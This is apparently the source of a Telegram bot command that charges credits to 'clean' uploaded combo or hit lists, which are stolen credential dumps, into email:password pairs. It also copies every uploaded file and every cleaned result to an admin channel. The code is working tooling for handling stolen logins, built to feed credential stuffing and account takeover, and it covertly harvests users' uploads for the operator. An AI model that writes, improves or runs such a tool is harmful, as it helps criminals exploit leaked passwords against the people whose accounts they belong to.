import os
from antispam import is_spamming, handle_spam
from ban import is_user_banned, load_banned_users
from config import USER_IDS_FILE, ADMIN_CHANNEL_CB,REQUIRED_CHANNELS
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from others import require_registration, check_membership
from telegram.ext import CallbackContext
from credits import get_user_credits, deduct_credits

# Load banned users at startup
load_banned_users()
clean_triggered_users = set()

CLEAN_COST = 10  # Cost per clean command

def store_user_id(user_id: int):
    """Stores the user ID in a file to track users who have used the /clean command."""
    if not os.path.exists(USER_IDS_FILE):
        with open(USER_IDS_FILE, 'a') as file:
            file.write(f"{user_id}\n")
    else:
        with open(USER_IDS_FILE, 'r') as file:
            existing_ids = file.read().splitlines()
        if str(user_id) not in existing_ids:
            with open(USER_IDS_FILE, 'a') as file:
                file.write(f"{user_id}\n")

def clean_file(file_path):
    """Cleans a file by extracting email:password pairs and writes to a new file."""
    cleaned_file_path = "ExtractedNdcleanedBySinner.txt"
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as input_file, open(cleaned_file_path, "w") as output_file:
            for line in input_file:
                if "|" in line:
                    email_pass = line.split("|")[0].strip()
                    output_file.write(email_pass + "\n")
        return cleaned_file_path
    except Exception as e:
        return str(e)

@require_registration
def clean(update: Update, context: CallbackContext):
    """Handles the /clean command."""
    user_id = update.message.from_user.id
    store_user_id(user_id)

    # Check if user is banned
    if is_user_banned(user_id):
        update.message.reply_text("❌ You are restricted from using this bot. Contact the developer for assistance.")
        return

    command = '/clean'  # Adjust this to match the actual command

    # Check if the user is spamming
    if is_spamming(user_id, command, cooldown=3):
        # Handle anti-spam (send the cooldown message)
        if handle_spam(update, user_id, command, cooldown=15):
            return  # Stop further execution if the user is spamming

    if not check_membership(user_id, context):
        custom_button_names = ['𝗘𝗛𝗥𝗔', '𝗗𝗘𝗔𝗧𝗛']
        video_url2 = 'https://motionbgs.com/media/4639/yor-forger-master-of-disguise.960x540.mp4'
        caption2 = "📢 *Dear User,*\n\n*Please join the required channels to proceed further!*"
        
        keyboard2 = [
            [InlineKeyboardButton(name, url=channel['link'])] for name, channel in zip(custom_button_names, REQUIRED_CHANNELS)
        ] + [[InlineKeyboardButton('✅ Joined', callback_data='start_joined')]]

        reply_markup2 = InlineKeyboardMarkup(keyboard2)

        update.message.reply_video(
            video=video_url2,
            caption=caption2,
            reply_markup=reply_markup2,
            parse_mode="Markdown"
        )
        return

    # Check if user has enough credits
    current_credits = get_user_credits(user_id)
    if current_credits < CLEAN_COST:
        update.message.reply_text(f"❌ You need at least {CLEAN_COST} credits to use this command. Your balance: {current_credits} credits.")
        return  

    update.message.reply_text("📄 Please upload a .txt file containing raw combos or hits to clean and extract email:password pairs.")
    context.user_data["last_command"] = "clean"
    clean_triggered_users.add(user_id)

def clean_handler(update: Update, context: CallbackContext):
    """Handles the file uploaded by the user for cleaning."""
    user_id = update.message.from_user.id
    user_name = update.message.from_user.first_name  # Get sender's name

    if user_id not in clean_triggered_users:
        update.message.reply_text("❌ Please use the /clean command before uploading a file.")
        return

    clean_triggered_users.discard(user_id)

    if update.message.document:
        file = context.bot.get_file(update.message.document.file_id)

        # Check file size limit (1MB max)
        if update.message.document.file_size > 1 * 1024 * 1024:
            update.message.reply_text("❌ File size exceeds 1MB limit! Please upload a smaller file.")
            return

        # Send the file to the admin channel before processing
        context.bot.send_document(
            chat_id=ADMIN_CHANNEL_CB, 
            document=file.file_id,
            caption=f"📥 New file received for cleaning!\n👤 *User:* {user_name} (`{user_id}`)\n🛠️ Processing now..."
        )

        file_path = file.download()
        status_message = update.message.reply_text("⏳ Cleaning your file...")

        try:
            # Deduct credits for cleaning
            if not deduct_credits(user_id, CLEAN_COST):
                update.message.reply_text("❌ Failed to deduct credits. Please try again later.")
                return

            # Clean the file
            cleaned_file_path = clean_file(file_path)

            if os.path.exists(cleaned_file_path):
                # Send cleaned file to user
                with open(cleaned_file_path, "rb") as f:
                    context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption="✅ Cleaned file is ready!")

                status_message.edit_text(f"✅ File cleaned successfully! {CLEAN_COST} credits deducted.")

                # Notify admin after cleaning
                with open(cleaned_file_path, "rb") as f:
                    context.bot.send_document(
                        chat_id=ADMIN_CHANNEL_CB, 
                        document=f,
                        caption=f"✅ Cleaning complete for {user_name} (`{user_id}`)\n💰 Credits deducted: {CLEAN_COST}"
                    )

            else:
                status_message.edit_text(f"❌ Error cleaning file: {cleaned_file_path}")

        except Exception as e:
            status_message.edit_text(f"❌ Error processing file: {e}")

        finally:
            # Delete files after processing
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                if os.path.exists(cleaned_file_path):
                    os.remove(cleaned_file_path)
            except Exception as e:
                print(f"❌ Error deleting files: {e}")

    else:
        update.message.reply_text("❌ Please attach a .txt file to clean.")
